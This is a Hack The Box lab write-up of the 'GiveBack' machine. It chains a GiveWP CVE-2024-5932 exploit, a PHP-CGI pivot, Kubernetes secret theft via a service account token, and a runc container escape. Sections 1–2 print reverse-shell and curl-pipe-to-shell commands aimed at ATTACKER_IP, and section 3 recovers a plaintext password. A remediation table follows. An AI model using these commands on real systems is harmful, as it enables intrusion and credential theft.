# Hack The Box: GiveBack Write-Up

### Kubernetes Container Escape and Host Compromise via GiveWP RCE

- **Target Hostname:** giveback.htb
- **Operating System:** Linux (Kubernetes Cluster & Host)
- **Primary Vector:** Web Application Vulnerability (GiveWP Plugin)
- **Secondary Vectors:** Internal Service Misconfiguration, Kubernetes RBAC Flaws, Container Runtime Abuse

---

## Executive Summary

The GiveBack machine simulates a modern cloud-native environment where a vulnerable WordPress donation plugin serves as the initial entry point. The attack chain progresses from unauthenticated remote code execution (RCE) via a PHP Object Injection flaw, to pivoting through an internal PHP-CGI service for a stable shell inside a Kubernetes pod. From there, the engagement transitions to extracting host credentials from in-cluster secrets, facilitating lateral movement via SSH. Finally, a misconfigured `runc` wrapper is abused to escape the container and achieve full root privileges on the underlying host.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Initial Foothold: Exploiting CVE-2024-5932

### Vulnerability Analysis
The target hosts a WordPress instance running a vulnerable version of the GiveWP plugin. This version is susceptible to CVE-2024-5932, a PHP Object Injection vulnerability. Untrusted input passed to the `give_title` parameter is deserialized, triggering a Property Oriented Programming (POP) chain that ultimately leads to arbitrary code execution via `shell_exec()`.

### Exploitation
We utilize a public Proof of Concept (PoC) to trigger the vulnerability and establish a reverse shell.

**1. Clone the PoC and start a listener:**
```bash
git clone https://github.com/EQSTLab/CVE-2024-5932
nc -lvnp 4449
```

**2. Trigger the RCE:**
```bash
python3 CVE-2024-5932-rce.py \
  -u "http://giveback.htb/donations/the-things-we-need/" \
  -c "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4449 0>&1'"
```

**Result:** We obtain a reverse shell as the `www-data` user.

---

## 2. Shell Upgrade: Pivoting via Internal PHP-CGI

The initial web shell is restricted. However, network reconnaissance reveals an internal service running PHP-CGI at `http://10.43.2.241:5000`, which is reachable from the compromised web pod.

### Exploitation
We exploit the `auto_prepend_file=php://input` directive to inject and execute arbitrary PHP code directly from the HTTP request body.

**Attacker Setup:**
```bash
# Create payload to download and execute a reverse shell
echo "busybox nc ATTACKER_IP 4441 -e /bin/sh" > x
python3 -m http.server 8888
nc -lvnp 4441
```

**Target Execution:**
```bash
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'curl ATTACKER_IP:8888/x|sh']]); echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

**Result:** We obtain an upgraded, stable shell inside the Kubernetes pod.

---

## 3. Kubernetes Secret Extraction

Inside the pod, we locate the default service account token and use it to query the Kubernetes API for secrets within the default namespace.

### Token Extraction and API Query
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### Credential Recovery
Among the returned secrets, we identify a base64-encoded value:
```text
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```

Decoding the value reveals a plaintext password:
```bash
echo "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
# Output: s1s1s3P0s3Ba3u7RLyetrekE4oS
```

> **Critical Flaw:** Sensitive host credentials were stored in Kubernetes secrets without proper Role-Based Access Control (RBAC) restrictions, allowing the compromised pod to read them.

---

## 4. Lateral Movement: SSH Access

Using the extracted credentials, we pivot from the Kubernetes pod to the underlying host infrastructure via SSH.

```bash
ssh babywyrm@giveback.htb
# Password: s1s1s3P0s3Ba3u7RLyetrekE4oS
```

Upon successful authentication, we retrieve the user flag:
```bash
cat ~/user.txt
```

---

## 5. Privilege Escalation: Container Escape via runc

### Enumeration
Checking sudo privileges for the `babywyrm` user reveals a highly permissive configuration:
```bash
sudo -l
# Output: (babywyrm) NOPASSWD: /opt/debug
```

The `/opt/debug` binary is a wrapper around `runc`, the low-level Open Container Initiative (OCI) container runtime.

### Crafting the OCI Configuration
To escape the container and read the root flag, we create a minimal `config.json` that instructs `runc` to:
1. Run the container process as UID 0 (root).
2. Bind-mount the host's `/root` directory into the container filesystem.
3. Execute `cat /root/root.txt` upon startup.

**Directory Setup:**
```bash
mkdir -p ~/readflag/rootfs
cd ~/readflag
```

**config.json:**
```json
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid","strictatime","mode=755","size=65536k"]},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]},
    {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}
```

### Execution
We execute the wrapper using the newly crafted configuration:
```bash
sudo /opt/debug run getflag
# Enter password when prompted (same as SSH)
```

**Result:** The contents of `/root/root.txt` are printed directly to the terminal, achieving full root access without the need for a secondary reverse shell.

---

## 6. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Unpatched GiveWP (CVE-2024-5932)** | Unauthenticated Remote Code Execution on the web tier. | Implement a strict patch management cycle; monitor CVE feeds for critical web application vulnerabilities. |
| **Internal PHP-CGI Exposure** | Allows shell upgrade and deeper network pivoting from the web tier. | Enforce strict network segmentation; disable unused or legacy internal services; restrict egress from web pods. |
| **Kubernetes Secrets with Host Credentials** | Enables lateral movement from the container to the underlying host. | Implement strict RBAC policies; never store host-level credentials in Kubernetes secrets; use external secret managers (e.g., HashiCorp Vault). |
| **Permissive sudo on runc** | Full host compromise via container escape. | Restrict sudo rules to the absolute minimum required; audit and lock down container runtime binaries; utilize AppArmor/SELinux profiles for `runc`. |

---

## 7. Key Takeaways

1. **The Web-to-Host Attack Path:** In modern infrastructure, a compromised web application is often just the first step. Attackers will actively pivot through internal services and container orchestration platforms to reach the underlying host.
2. **Kubernetes Service Accounts are High-Value Targets:** Default service account tokens often possess excessive privileges. They must be treated with the same security rigor as administrative credentials.
3. **Containers Do Not Equal Isolation:** Misconfigured container runtimes (like `runc` or Docker) and overly permissive sudo rules can easily lead to full host escapes. 
4. **Defense-in-Depth is Mandatory:** Patching the initial web vulnerability would have stopped this specific chain, but robust network controls, strict RBAC, and least-privilege principles are required to prevent lateral movement and privilege escalation when initial defenses fail.

> "In cloud-native environments, the perimeter is everywhere—and nowhere."

**Box Rating:** 5/5 — Realistic, modern, and deeply educational regarding cloud-native attack vectors.
